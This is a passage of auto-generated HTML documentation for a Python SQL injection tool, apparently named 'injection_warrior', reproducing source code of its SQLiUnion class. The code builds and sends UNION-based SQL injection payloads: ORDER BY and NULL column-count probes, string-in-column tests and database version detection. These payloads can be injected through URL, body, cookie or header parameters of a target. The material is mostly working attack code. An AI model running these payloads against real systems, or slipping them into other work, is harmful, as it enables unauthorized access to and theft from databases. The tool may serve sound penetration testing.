    def _run(self, http_method=&#34;get&#34;, urls=[], html=False, injection_point=&#34;url&#34;, body_params={}, req_json=False, resp_json=False, cookie_params={}, url_params={}, header_params={}):
        return super(SQLiUnion, self)._run(http_method, urls, html, injection_point, body_params, req_json, resp_json, cookie_params, url_params, header_params)

    def _params_converted(self, payloads=[], params={}):
        return super(SQLiUnion, self)._params_converted(payloads=payloads, params=params)

    # END Base methods

    def __gen_order_by(self, columns=1, comment=&#39;--&#39;, delimiter=&#34;+&#34;, cookie=False, quote=&#34;&#39;&#34;, param_value=&#34;test&#34;):
        payloads = []
        for i in (128, 64, 32, 16, 8, 4, 2, 1):
            if columns &gt;= i:
                if cookie:
                    payloads.append(&#34;{}{}{}ORDER{}BY{}{}{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, i, comment, delimiter))
                else:
                    payloads.append(&#34;{}{}{}ORDER{}BY{}{}{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, i, comment, delimiter))
                columns = columns-i
            else:
                if cookie:
                    payloads.append(&#34;{}{}{}ORDER{}BY{}{}{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, i, comment, delimiter))
                else:
                    payloads.append(&#34;{}{}{}ORDER{}BY{}{}{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, i, comment, delimiter))
        return payloads

    def __gen_nulls(self, columns=1, comment=&#34;--&#34;, delimiter=&#34;+&#34;, oracle=False, cookie=False, comma=&#34;,&#34;):
        query = &#34;{}UNION{}SELECT{}&#34;.format(delimiter, delimiter, delimiter)
        payload = &#39;&#39;
        if cookie:
            payload = &#34;%2cNULL&#34; * columns
        else:
            payload = &#34;{}NULL&#34;.format(comma) * columns
        if oracle:
            payload = query + payload + delimiter+&#34;FROM&#34;+delimiter+&#34;DUAL&#34;+comment+delimiter
        else:
            payload = query + payload + comment+delimiter
        if not cookie:
            payload = payload.replace(comma, &#39;&#39;, 1)
        else:
            payload = payload.replace(&#39;%2c&#39;, &#39;&#39;, 1)
        return payload

    def union_find_columns_number(self, http_method=&#34;get&#34;, url=&#34;&#34;, columns=1, injection_method=&#34;null&#34;, html=False, injection_point=&#34;url&#34;, url_params={}, body_params={}, cookie_params={}, header_params={}, param_value=&#34;test&#34;, req_json=False, resp_json=False, **kwargs):
        
        &#34;&#34;&#34;method allows to find number of columns for SQL Union based injection

        Args:
            url (str): [URL for endpoint]. Defaults to &#34;&#34;.
            http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to &#34;get&#34;.
            injection_point (str, optional): [Place where payloads should be injected]. Defaults to &#34;url&#34;.
            injection_method (str, optional): [NULL based or ORDER BY injection method]. Defaults to &#34;null&#34;.
            columns (int, optional): [Number of columns]. Defaults to 1.
            param_value (int, optional): [Optional string prefixed before payload]. Defaults to &#34;test&#34;.
            body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
            resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
            html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
            cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True
            kwargs(dict, optional) [quote: &#34;&#39;&#34;, delimiter: &#39;+&#39;, comment: &#39;--&#39;, comma: &#34;,&#34;, oracle: False, nulls: 1, table_name:  &#34;&#34;, column_name_1: &#34;&#34;, column_name_2: &#34;&#34;, sleep: 5]

        Returns:
            [dict]: Dictionary as key value pair
        &#34;&#34;&#34;
        self.resp_json = resp_json
        self.req_json = req_json
        self.html = html
        self.url = url
        self.http_method = http_method
        http_method = http_method.lower()
        body_params_list = []
        
        quote = kwargs.get(&#39;quote&#39;) if kwargs.get(&#39;quote&#39;) != None else &#34;&#39;&#34;
        comma = kwargs.get(&#39;comma&#39;) if kwargs.get(&#39;comma&#39;) != None else &#34;,&#34;
        delimiter = kwargs.get(&#39;delimiter&#39;) if kwargs.get(&#39;delimiter&#39;) != None else &#34;+&#34;
        comment = kwargs.get(&#39;comment&#39;) if kwargs.get(&#39;comment&#39;) != None else &#34;--&#34;
        oracle = kwargs.get(&#39;oracle&#39;) if kwargs.get(&#39;columns&#39;) != None else False

        urls = [url]
        
        if self.debug:
            print(colored(
                &#39;&#39;&#39;[+] UNION attack &#39;FIND COLUMNS NUMBER&#39;selected parameters: 
            HTTP METHOD: {}
            URL: {}
            GUESTED COLUMNS: {}
            INJECTION METHOD: {}
            DBMS ORACLE: {}
            RETURN HTML: {}
            INJECTION POINT: {}
            BODY PARAMS: {}
            COOKIE PARAMS: {}
            HEADER PARAMS: {}
            URL PARAMS: {}
            URL PARAM VALUE: {}
            REQ JSON: {}
            RESP JSON: {}
            KWAGRS: {}
            &#39;&#39;&#39;.format(http_method, url, columns, injection_method, html, injection_point, body_params, cookie_params, header_params, url_params, param_value, req_json, resp_json, kwargs), &#34;yellow&#34;))
        # START SECTION URL INJECTION
        if injection_method == &#34;null&#34; and injection_point == &#34;url&#34;:
            payloads = []
            for i in range(1, columns):
                payload = self.__gen_nulls(
                    columns=i, comment=comment, delimiter=delimiter, oracle=oracle)
                payloads.append(param_value+quote+payload)
            url_params_list = self._params_converted(payloads=payloads, params=url_params)
            return self._run(http_method=http_method, urls=urls, html=html, url_params=url_params_list, injection_point=injection_point, cookie_params=cookie_params)

        elif injection_method == &#34;order_by&#34; and injection_point == &#34;url&#34;:
            payloads = self.__gen_order_by(
                columns=columns, comment=comment, delimiter=delimiter, param_value=param_value)
            url_params_list = self._params_converted(payloads=payloads, params=url_params)
            return self._run(http_method=http_method, urls=urls, html=html, url_params=url_params_list, injection_point=injection_point, cookie_params=cookie_params)

        # END SECTION URL INJECTION

        # START SECTION BODY INJECTION

        elif injection_method == &#34;null&#34; and injection_point == &#34;body&#34;:
            payloads = []
            for i in range(1, columns):
                payload = self.__gen_nulls(
                    columns=i, comment=comment, delimiter=delimiter, oracle=oracle)
                p = quote + payload
                payloads.append(p)
            body_params_list = self._params_converted(payloads=payloads, params=body_params)
            return self._run(http_method=http_method, urls=url, html=html, injection_point=injection_point, body_params=body_params_list, req_json=req_json, resp_json=resp_json, cookie_params=cookie_params)

        elif injection_method == &#34;order_by&#34; and injection_point == &#34;body&#34;:
            payloads = self.__gen_order_by(
                columns=columns, comment=comment, delimiter=delimiter, param_value=param_value)
            body_params_list = self._params_converted(payloads=payloads, params=body_params)
            return self._run(http_method=http_method, urls=url, html=html, injection_point=injection_point, body_params=body_params_list, req_json=req_json, resp_json=resp_json, cookie_params=cookie_params)

        # END SECTION BODY INJECTION

        # START SECTION COOKIE INJECTION

        elif injection_method == &#34;null&#34; and injection_point == &#34;cookie&#34;:
            payloads = []
            for i in range(1, columns):
                payload = self.__gen_nulls(
                    columns=i, comment=comment, delimiter=delimiter, oracle=oracle, cookie=True)
                p = quote + payload
                payloads.append(p)
            cookie_param_list = self._params_converted(payloads=payloads, params=cookie_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_param_list,req_json=req_json, resp_json=resp_json,  body_params=body_params)

        elif injection_method == &#34;order_by&#34; and injection_point == &#34;cookie&#34;:
            payloads = self.__gen_order_by(
                columns=columns, comment=comment, delimiter=delimiter, cookie=True, quote=quote, param_value=param_value)
            cookie_param_list = self._params_converted(payloads=payloads, params=cookie_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_param_list, body_params=body_params, req_json=req_json, resp_json=resp_json)

        # END SECTION COOKIE INJECTION

        # START SECTION HEADER INJECTION

        elif injection_method == &#34;null&#34; and injection_point == &#34;header&#34;:
            payloads = []
            for i in range(1, columns):
                payload = self.__gen_nulls(
                    columns=i, comment=comment, delimiter=delimiter, oracle=oracle, cookie=False)
                p = param_value+quote + payload
                payloads.append(p)
            header_params_list = self._params_converted(payloads=payloads, params=header_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, req_json=req_json, resp_json=resp_json, header_params=header_params_list, body_params=body_params)

        elif injection_method == &#34;order_by&#34; and injection_point == &#34;header&#34;:
            payloads = self.__gen_order_by(
                columns=columns, comment=comment, delimiter=delimiter, cookie=False, quote=quote, param_value=param_value)
            header_params_list = self._params_converted(payloads=payloads, params=header_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, body_params=body_params, header_params=header_params_list,req_json=req_json, resp_json=resp_json)

        # END SECTION HEADER INJECTION

    def union_find_string_in_columns(self, url=&#34;&#34;, string=&#34;abcd&#34;, http_method=&#34;get&#34;, html=False, 
                                     injection_point=&#34;url&#34;, body_params={}, url_params={}, 
                                     header_params={}, param_value=&#34;test&#34;, req_json=False, 
                                     resp_json=False, cookie_params={}, columns=1, **kwargs):
        &#34;&#34;&#34;method allows to find selected string in generated columns payload for SQL Union based injection

        Args:
            url (str): [URL for endpoint]. Defaults to &#34;&#34;.
            http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to &#34;get&#34;.
            injection_point (str, optional): [Place where payloads should be injected]. Defaults to &#34;url&#34;.
            string (str, optional): [String to search in columns]. Defaults to &#34;abcd&#34;.
            columns (int, optional): [Number of columns]. Defaults to 1.
            param_value (int, optional): [Optional string prefixed before payload]. Defaults to &#34;test&#34;.
            body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
            resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
            html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
            cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True
            kwargs(dict, optional) [quote: &#34;&#39;&#34;, delimiter: &#39;+&#39;, comment: &#39;--&#39;, comma: &#34;,&#34;, oracle: False, nulls: 1, table_name:  &#34;&#34;, column_name_1: &#34;&#34;, column_name_2: &#34;&#34;, sleep: 5]

        Returns:
            [dict]: Dictionary as key value pair
        &#34;&#34;&#34;
        self.resp_json = resp_json
        self.req_json = req_json
        self.html = html
        self.url = url
        self.http_method = http_method
        http_method = http_method.lower()
        
        quote = kwargs.get(&#39;quote&#39;) if kwargs.get(&#39;quote&#39;) != None else &#34;&#39;&#34;
        comma = kwargs.get(&#39;comma&#39;) if kwargs.get(&#39;comma&#39;) != None else &#34;,&#34;
        delimiter = kwargs.get(&#39;delimiter&#39;) if kwargs.get(&#39;delimiter&#39;) != None else &#34;+&#34;
        comment = kwargs.get(&#39;comment&#39;) if kwargs.get(&#39;comment&#39;) != None else &#34;--&#34;
        oracle = kwargs.get(&#39;oracle&#39;) if kwargs.get(&#39;columns&#39;) != None else False
        urls = [url]
        
        params_list = []
        if self.debug:
            print(colored(
                &#39;&#39;&#39;[+] UNION attack &#39;FIND STRING IN COLUMNS&#39; selected parameters: 
            HTTP METHOD: {}
            URL: {}
            RETURN HTML: {}
            INJECTION POINT: {}
            BODY PARAMS: {}
            COOKIE PARAMS: {}
            URL PARAMS: {}
            HEADER PARAMS: {}
            REQ JSON: {}
            RESP JSON: {}
            KWARGS: {}
            &#39;&#39;&#39;.format(http_method, url, html, injection_point, body_params, cookie_params, url_params, header_params, req_json, resp_json, kwargs), &#34;yellow&#34;))
        string = &#34;{}{}{}&#34;.format(quote, string, quote)
        if injection_point == &#34;url&#34;:
            payloads = []
            temp = &#39;&#39;
            nulls = [&#34;NULL&#34; for x in range(columns)]
            for i in range(0, len(nulls)):
                if nulls[i] == &#34;NULL&#34;:
                    nulls[i] = string
                    p = &#39;{}&#39;.format(comma).join(nulls)
                    if oracle:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                    else:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                    payloads.append(payload)
                nulls[i] = &#34;NULL&#34;
            url_params_list = self._params_converted(payloads=payloads, params=url_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, url_params=url_params_list, cookie_params=cookie_params, body_params=params_list, req_json=req_json, resp_json=resp_json)
        elif injection_point == &#34;body&#34;:
            payloads = []
            temp = &#39;&#39;
            nulls = [&#34;NULL&#34; for x in range(columns)]
            for i in range(0, len(nulls)):
                if nulls[i] == &#34;NULL&#34;:
                    nulls[i] = string
                    p = &#39;{}&#39;.format(comma).join(nulls)
                    if oracle:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                    else:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                    temp += payload
                nulls[i] = &#34;NULL&#34;
                payloads.append(temp)
            params_list = self._params_converted(payloads=payloads, params=body_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, body_params=params_list, req_json=req_json, resp_json=resp_json)

        elif injection_point == &#34;cookie&#34;:
            payloads = []
            nulls = [&#34;NULL&#34; for x in range(columns)]
            temp = &#39;&#39;
            for i in range(0, len(nulls)):
                if nulls[i] == &#34;NULL&#34;:
                    nulls[i] = string
                    p = &#39;%2c&#39;.join(nulls)
                    if oracle:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                    else:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                    temp += payload
                nulls[i] = &#34;NULL&#34;
                payloads.append(temp)
            cookie_params_list = self._params_converted(payloads, cookie_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params_list, body_params=body_params, req_json=req_json, resp_json=resp_json)

        elif injection_point == &#34;header&#34;:
            payloads = []
            temp = &#39;&#39;
            nulls = [&#34;NULL&#34; for x in range(columns)]
            for i in range(0, len(nulls)):
                if nulls[i] == &#34;NULL&#34;:
                    nulls[i] = string
                    p = &#39;{}&#39;.format(quote).join(nulls)
                    if oracle:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                    else:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                    temp += payload
                nulls[i] = &#34;NULL&#34;
                payloads.append(temp)
            header_params_list = self._params_converted(payloads, header_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, body_params=body_params, header_params=header_params_list, req_json=req_json, resp_json=resp_json)

    def union_identify_database_version(self, url=&#34;&#34;, http_method=&#34;get&#34;, dbms=&#34;mysql&#34;, oracle=False, payloads=[], 
                                        injection_point=&#34;url&#34;,  body_params={}, req_json=False, resp_json=False, html=None, 
                                        cookie_params={}, url_params={}, string=&#39;test1234&#39;, header_params={}, **kwargs):
        
        &#34;&#34;&#34;method allows to identify database version for SQL Union based injection attack

        Args:
            url (str): [URL for endpoint]. Defaults to &#34;&#34;.
            http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to &#34;get&#34;.
            injection_point (str, optional): [Place where payloads should be injected]. Defaults to &#34;url&#34;.
            string (str, optional): [String to search in columns]. Defaults to &#34;abcd&#34;.
            dbms (str, optional): [DBMS type for which to generate payloads]. Defaults to &#34;abcd&#34;.
            param_value (int, optional): [Optional string prefixed before payload]. Defaults to &#34;test&#34;.
            body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
            resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
            html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
            cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True
            kwargs(dict, optional) [quote: &#34;&#39;&#34;, delimiter: &#39;+&#39;, comment: &#39;--&#39;, comma: &#34;,&#34;, oracle: False, nulls: 1, table_name:  &#34;&#34;, column_name_1: &#34;&#34;, column_name_2: &#34;&#34;, sleep: 5]

        Returns:
            [dict]: Dictionary as key value pair
        &#34;&#34;&#34;
        if oracle:
            dbms = &#34;oracle&#34;
        if dbms == &#34;&#34;:
            print(colored(&#34;[-] Empty dbms not supported&#34;, &#34;red&#34;))
            sys.exit(0)
        if (dbms == &#34;mysql&#34; and oracle) or (dbms == &#34;postgreSQL&#34; and oracle) or (dbms == &#34;microsoftSQL&#34; and oracle):
            print(colored(
                &#34;[-] Not supported combination for dbms:&#39;{}&#39; and oracle: &#39;{}&#39; &#34;.format(dbms, oracle), &#34;red&#34;))
            sys.exit(0)
            
        quote = kwargs.get(&#39;quote&#39;) if kwargs.get(&#39;quote&#39;) != None else &#34;&#39;&#34;
        comma = kwargs.get(&#39;comma&#39;) if kwargs.get(&#39;comma&#39;) != None else &#34;,&#34;
        self.resp_json = resp_json
        self.req_json = req_json
        self.html = html
        self.url = url
        self.http_method = http_method
        http_method = http_method.lower()
        
        urls= [url]
        
        if self.debug:
            print(colored(
                &#39;&#39;&#39;[+] UNION attack &#39;IDENTIFY DATABSE&#39; selected parameters: 
            URL: {}
            HTTP METHOD: {}
            DBMS: {}
            ORACLE: {}
            ORIGINAL PAYLOAD: {}
            INJECTION POINT: {}
            BODY PARAMS: {}
            REQ JSON: {}
            RESP JSON: {}
            RETURN HTML: {}
            COOKIE PARAMS: {}
            URL PARAMS: {}
            BODY PARAMS: {}
            HEADER PARAMS: {}
            STRING TO REPLACE: {}
            PARAM VALUE: {}
            DELIMITER: {}
            KWARGS: {}
            &#39;&#39;&#39;.format(url, http_method, dbms, oracle, payloads, injection_point,  body_params, req_json, resp_json, html, cookie_params, url_params, body_params, header_params, string, kwargs), &#34;yellow&#34;))

        version = sqli_payloads.get(&#39;version_detection&#39;).get(dbms)
        payloads_list = []
        i = 0
        temp = &#39;&#39;
        p = &#39;&#39;
        if oracle:
            for p in payloads:
                p = p.replace(&#34;,NULL&#34;, &#34;&#34;)
                p = p.replace(&#34;FROM DUAL-- &#34;, &#34;&#34;)
            for v in version:
                i += 1
                temp = p.replace(quote+string+quote, v)
                payloads_list.append(temp)
            print(
                colored(&#34;[+] Datbase version payloads: {}&#34;.format(payloads_list), &#34;yellow&#34;))
        else:
            for p in payloads:
                p = re.sub(&#39;,&#39;, comma, p)
                i += 1
                p = p.replace(quote+string+quote, version)
                payloads_list.append(p)
            print(
                colored(&#34;[+] Datbase version payloads: {}&#34;.format(payloads_list), &#34;yellow&#34;))
        if injection_point == &#34;url&#34;:
            if oracle:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                url_params_list = self._params_converted(payloads=values, params=url_params)
            else:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                url_params_list = self._params_converted(payloads=values, params=url_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, url_params=url_params_list, header_params=header_params, body_params=body_params, req_json=req_json, resp_json=resp_json)

        elif injection_point == &#34;body&#34;:
            if oracle:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                body_params_list = self._params_converted(payloads=values, params=body_params)
            else:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                body_params_list = self._params_converted(payloads=values, params=body_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, url_params=url_params, header_params=header_params, body_params=body_params_list, req_json=req_json, resp_json=resp_json)

        elif injection_point == &#34;header&#34;:
            if oracle:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                header_params_list = self._params_converted(
                    payloads=values, params=header_params)
            else:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                header_params_list = self._params_converted(payloads=values, params=header_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, url_params=url_params, body_params=body_params, header_params=header_params_list,req_json=req_json, resp_json=resp_json)

        elif injection_point == &#34;cookie&#34;:
            if oracle:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                cookie_params_list = self._params_converted(
                    payloads=values, params=cookie_params)
            else:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                cookie_params_list = self._params_converted(
                    payloads=values, params=cookie_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params_list, url_params=url_params, body_params=body_params, header_params=header_params, req_json=req_json, resp_json=resp_json)</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="injection_warrior.warrior.Injector" href="warrior.html#injection_warrior.warrior.Injector">Injector</a></li>
<li><a title="injection_warrior.common.Common" href="common.html#injection_warrior.common.Common">Common</a></li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="injection_warrior.sqli_union.SQLiUnion.union_find_columns_number"><code class="name flex">
<span>def <span class="ident">union_find_columns_number</span></span>(<span>self, http_method='get', url='', columns=1, injection_method='null', html=False, injection_point='url', url_params={}, body_params={}, cookie_params={}, header_params={}, param_value='test', req_json=False, resp_json=False, **kwargs)</span>
</code></dt>
<dd>
<div class="desc"><p>method allows to find number of columns for SQL Union based injection</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>url</code></strong> :&ensp;<code>str</code></dt>
<dd>[URL for endpoint]. Defaults to "".</dd>
<dt><strong><code>http_method</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>[HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to "get".</dd>
<dt><strong><code>injection_point</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>[Place where payloads should be injected]. Defaults to "url".</dd>
<dt><strong><code>injection_method</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>[NULL based or ORDER BY injection method]. Defaults to "null".</dd>
<dt><strong><code>columns</code></strong> :&ensp;<code>int</code>, optional</dt>
<dd>[Number of columns]. Defaults to 1.</dd>
<dt><strong><code>param_value</code></strong> :&ensp;<code>int</code>, optional</dt>
<dd>[Optional string prefixed before payload]. Defaults to "test".</dd>
<dt><strong><code>body_params</code></strong> :&ensp;<code>dict</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>req_json</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if request should be send as JSON formatted data]. Defaults to False.</dd>
<dt><strong><code>resp_json</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if response should be displayed as JSON formatted data]. Defaults to False.</dd>
<dt><strong><code>html</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if response should be displayed as HTML]. Defaults to False.</dd>
<dt><strong><code>cookie_params</code></strong> :&ensp;<code>dict</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>url_params</code></strong> :&ensp;<code>list</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>header_params</code></strong> :&ensp;<code>list</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>resp_body</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if response body should be printed on output console]. Defaults to True</dd>
</dl>
<p>kwargs(dict, optional) [quote: "'", delimiter: '+', comment: '&ndash;', comma: ",", oracle: False, nulls: 1, table_name:
"", column_name_1: "", column_name_2: "", sleep: 5]</p>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>[dict]</code></dt>
<dd>Dictionary as key value pair</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def union_find_columns_number(self, http_method=&#34;get&#34;, url=&#34;&#34;, columns=1, injection_method=&#34;null&#34;, html=False, injection_point=&#34;url&#34;, url_params={}, body_params={}, cookie_params={}, header_params={}, param_value=&#34;test&#34;, req_json=False, resp_json=False, **kwargs):
    
    &#34;&#34;&#34;method allows to find number of columns for SQL Union based injection

    Args:
        url (str): [URL for endpoint]. Defaults to &#34;&#34;.
        http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to &#34;get&#34;.
        injection_point (str, optional): [Place where payloads should be injected]. Defaults to &#34;url&#34;.
        injection_method (str, optional): [NULL based or ORDER BY injection method]. Defaults to &#34;null&#34;.
        columns (int, optional): [Number of columns]. Defaults to 1.
        param_value (int, optional): [Optional string prefixed before payload]. Defaults to &#34;test&#34;.
        body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
        resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
        html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
        cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True
        kwargs(dict, optional) [quote: &#34;&#39;&#34;, delimiter: &#39;+&#39;, comment: &#39;--&#39;, comma: &#34;,&#34;, oracle: False, nulls: 1, table_name:  &#34;&#34;, column_name_1: &#34;&#34;, column_name_2: &#34;&#34;, sleep: 5]

    Returns:
        [dict]: Dictionary as key value pair
    &#34;&#34;&#34;
    self.resp_json = resp_json
    self.req_json = req_json
    self.html = html
    self.url = url
    self.http_method = http_method
    http_method = http_method.lower()
    body_params_list = []
    
    quote = kwargs.get(&#39;quote&#39;) if kwargs.get(&#39;quote&#39;) != None else &#34;&#39;&#34;
    comma = kwargs.get(&#39;comma&#39;) if kwargs.get(&#39;comma&#39;) != None else &#34;,&#34;
    delimiter = kwargs.get(&#39;delimiter&#39;) if kwargs.get(&#39;delimiter&#39;) != None else &#34;+&#34;
    comment = kwargs.get(&#39;comment&#39;) if kwargs.get(&#39;comment&#39;) != None else &#34;--&#34;
    oracle = kwargs.get(&#39;oracle&#39;) if kwargs.get(&#39;columns&#39;) != None else False

    urls = [url]
    
    if self.debug:
        print(colored(
            &#39;&#39;&#39;[+] UNION attack &#39;FIND COLUMNS NUMBER&#39;selected parameters: 
        HTTP METHOD: {}
        URL: {}
        GUESTED COLUMNS: {}
        INJECTION METHOD: {}
        DBMS ORACLE: {}
        RETURN HTML: {}
        INJECTION POINT: {}
        BODY PARAMS: {}
        COOKIE PARAMS: {}
        HEADER PARAMS: {}
        URL PARAMS: {}
        URL PARAM VALUE: {}
        REQ JSON: {}
        RESP JSON: {}
        KWAGRS: {}
        &#39;&#39;&#39;.format(http_method, url, columns, injection_method, html, injection_point, body_params, cookie_params, header_params, url_params, param_value, req_json, resp_json, kwargs), &#34;yellow&#34;))
    # START SECTION URL INJECTION
    if injection_method == &#34;null&#34; and injection_point == &#34;url&#34;:
        payloads = []
        for i in range(1, columns):
            payload = self.__gen_nulls(
                columns=i, comment=comment, delimiter=delimiter, oracle=oracle)
            payloads.append(param_value+quote+payload)
        url_params_list = self._params_converted(payloads=payloads, params=url_params)
        return self._run(http_method=http_method, urls=urls, html=html, url_params=url_params_list, injection_point=injection_point, cookie_params=cookie_params)

    elif injection_method == &#34;order_by&#34; and injection_point == &#34;url&#34;:
        payloads = self.__gen_order_by(
            columns=columns, comment=comment, delimiter=delimiter, param_value=param_value)
        url_params_list = self._params_converted(payloads=payloads, params=url_params)
        return self._run(http_method=http_method, urls=urls, html=html, url_params=url_params_list, injection_point=injection_point, cookie_params=cookie_params)

    # END SECTION URL INJECTION

    # START SECTION BODY INJECTION

    elif injection_method == &#34;null&#34; and injection_point == &#34;body&#34;:
        payloads = []
        for i in range(1, columns):
            payload = self.__gen_nulls(
                columns=i, comment=comment, delimiter=delimiter, oracle=oracle)
            p = quote + payload
            payloads.append(p)
        body_params_list = self._params_converted(payloads=payloads, params=body_params)
        return self._run(http_method=http_method, urls=url, html=html, injection_point=injection_point, body_params=body_params_list, req_json=req_json, resp_json=resp_json, cookie_params=cookie_params)

    elif injection_method == &#34;order_by&#34; and injection_point == &#34;body&#34;:
        payloads = self.__gen_order_by(
            columns=columns, comment=comment, delimiter=delimiter, param_value=param_value)
        body_params_list = self._params_converted(payloads=payloads, params=body_params)
        return self._run(http_method=http_method, urls=url, html=html, injection_point=injection_point, body_params=body_params_list, req_json=req_json, resp_json=resp_json, cookie_params=cookie_params)

    # END SECTION BODY INJECTION

    # START SECTION COOKIE INJECTION

